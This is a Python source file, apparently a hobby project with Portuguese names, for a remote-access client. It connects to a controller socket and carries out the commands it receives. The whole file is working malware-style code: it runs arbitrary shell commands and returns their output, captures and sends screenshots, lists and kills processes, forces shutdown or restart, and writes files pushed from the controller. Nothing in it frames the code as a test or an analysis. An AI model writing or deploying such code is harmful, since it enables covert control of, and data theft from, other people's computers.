import socket as ss
from threading import Thread
import os
from pyautogui import alert, screenshot
import psutil as ps
import webbrowser
import io
import ctypes
from time import sleep
from Crypto import cripto as c
import requests


class Idd:
    def __init__(self):
        while True:
            self.problem = ""
            if self.make_connection() == "erro\n\n":
                self.__idle.close()
                self.make_connection()
            self.receber()

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def make_connection(self):
            try:
                self.__idle = ss.socket(ss.AF_INET, ss.SOCK_STREAM)
                self.__idle.connect((ss.gethostname(), 53361))
                self.pass_name()

            except ss.error:
                return "erro\n\n"

            except ConnectionAbortedError:
                return "erro\n\n"

            except ConnectionRefusedError:
                return "erro\n\n"

            except ConnectionResetError:
                return "erro\n\n"

            except Exception:
                return "erro\n\n"

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def pass_name(self):
        if os.path.isfile("SystemName.txt"):
            with open("SystemName.txt", "r") as txt:
                texto = txt.read()
                if texto != "None":
                    self.__idle.send(bytes(texto, "utf-8"))
                else:
                    self.__idle.send(bytes("isdefault", "utf-8"))
                txt.close()
        else:
            self.__idle.send(bytes("isdefault", "utf-8"))

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def receber(self):
        while True:
            try:
                if self.problem == "erro\n\n":
                    break
                code = self.__idle.recv(1024)
                if code:
                    __decode = code.decode("utf-8")
                    Thread(target=self.chamar, args=(__decode,)).start()
            except Exception:
                self.problem = "erro\n\n"

    @property
    def __decode(self):
        return self.data

    @__decode.setter
    def __decode(self, japones):
        resposta = requests.get("http://127.0.0.1:8080/client").json()
        print(c.descripto(japones, resposta["key"]))
        self.data = c.descripto(japones, resposta["key"])

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def chamar(self, path):
        if "\\" in path:
            pato = path.split("\\")

            if "killterminalpidprocess" in pato:
                Thread(target=self.__fechar, args=(pato[1],)).start()

            if "showpopupinwindow" in pato:
                Thread(target=self.__process_pop, args=(pato[1],)).start()

            if "siteentering" in pato:
                Thread(target=self.__site, args=(pato[1],)).start()

            if "terminalcommandexecute" in pato:
                Thread(target=self.__terminal_, args=(pato[1],)).start()

            if "sendfilearquivemidiaorfile" in pato:
                Thread(target=self.__file_recv, args=(pato[1],)).start()

            if "changeclientname" in pato:
                Thread(target=self.__change_name, args=(pato[1],)).start()

        else:
            if path == "shutdowncomputersystem":
                Thread(target=self.__desligar()).start()

            if path == "chatchallprocesslistandsend":
                Thread(target=self.__process_list).start()

            if path == "printscreensendconfirmationsignal":
                Thread(target=self.__system_photo).start()

            if path == "restartsystemcomputer":
                Thread(target=self.__restart_system).start()
                pass

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def __site(self, sitee):
        try:
            webbrowser.open(url=sitee, new=1)
            self.__idle.send(bytes("Site aberto", "utf-8"))
        except Exception:
            try:
                self.__idle.send(bytes("Site Error\n\n", "utf-8"))
                self.problem = "erro\n\n"
            except Exception:
                self.problem = "erro\n\n"

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def __desligar(self):
        try:
            os.system("shutdown -s -t 5")
            self.__idle.send(bytes("Comando executado", "utf-8"))
        except Exception:
            try:
                self.__idle.send(bytes("Shutdown Error\n\n", "utf-8"))
                self.problem = "erro\n\n"
            except Exception:
                self.problem = "erro\n\n"

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def __fechar(self, processo):
        try:
            resposta = os.popen(f"TASKKILL /IM {processo} /F").read()
            print(resposta)
            self.__idle.send(bytes(resposta, "utf-8"))
        except Exception:
            try:
                self.__idle.send(bytes("Close Error\n\n", "utf-8"))
                self.problem = "erro\n\n"
            except Exception:
                self.problem = "erro\n\n"

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def __process_pop(self, msg):
        try:
            alert(msg)
            self.__idle.send(bytes(f"Comando executado!", "utf-8"))
        except Exception:
            try:
                os.system(f'echo msgbox "{msg}" > %tmp%\\tmp.vbs')
                os.system('cscript /nologo %tmp%\\tmp.vbs')
                os.system('del %tmp%\\tmp.vbs')
            except Exception:
                try:
                    self.__idle.send(bytes("Popup Error\n\n", "utf-8"))
                    self.problem = "erro\n\n"
                except Exception:
                    self.problem = "erro\n\n"

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def __process_list(self):
        try:
            processos = list()
            for proc in ps.process_iter():
                if not proc.name() in processos:
                    processos.append(proc.name())
            self.__idle.send(bytes(f"{processos}", "utf-8"))
        except Exception:
            try:
                self.__idle.send(bytes("Process list Error\n\n", "utf-8"))
                self.problem = "erro\n\n"
            except Exception:
                self.problem = "erro\n\n"

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def __system_photo(self):
        try:
            foto = screenshot()
            f = io.BytesIO()
            foto.save(f, 'PNG')
            self.__idle.send(bytes(f.getvalue()))

        except Exception:
            try:
                self.__idle.send(bytes("Photo Error\n\n", "utf-8"))
                self.problem = "erro\n\n"
            except Exception:
                self.problem = "erro\n\n"

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def __file_recv(self, name):
        try:
            wall = open(f"C:\\Users\\Public\\Documents\\Public_Docs\\{name}", "wb")
            while True:
                dab = self.__idle.recv(100000)
                if not dab:
                    self.__idle.send(bytes("Comando executado!", "utf-8"))
                    break
                wall.write(dab)
                continue
        except Exception:
            try:
                self.__idle.send(bytes("Download Error\n\n", "utf-8"))
                self.problem = "erro\n\n"
            except Exception:
                self.problem = "erro\n\n"

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def __terminal_(self, command):
        try:
            resposta = os.popen(command).read()
            self.__idle.send(bytes(resposta, "utf-8"))
        except Exception:
            try:
                self.__idle.send(bytes("Terminal Error\n\n", "utf-8"))
                self.problem = "erro\n\n"
            except Exception:
                self.problem = "erro\n\n"

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def __change_name(self, command):
        try:
            with open("SystemName.txt", "w+") as txt:
                txt.write(command)
                txt.close()
            self.__idle.send(bytes("Reiniciando para troca de nome!", "utf-8"))
            self.problem = "erro\n\n"
        except Exception:
            try:
                self.__idle.send(bytes("Terminal Error\n\n", "utf-8"))
                self.problem = "erro\n\n"
            except Exception:
                self.problem = "erro\n\n"

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def __restart_system(self):
        try:
            os.system("shutdown /r /t 0")
            self.__idle.send(bytes("Comando executado", "utf-8"))
        except Exception:
            try:
                self.__idle.send(bytes("Restart Error\n\n", "utf-8"))
                self.problem = "erro\n\n"
            except Exception:
                self.problem = "erro\n\n"


Idd()
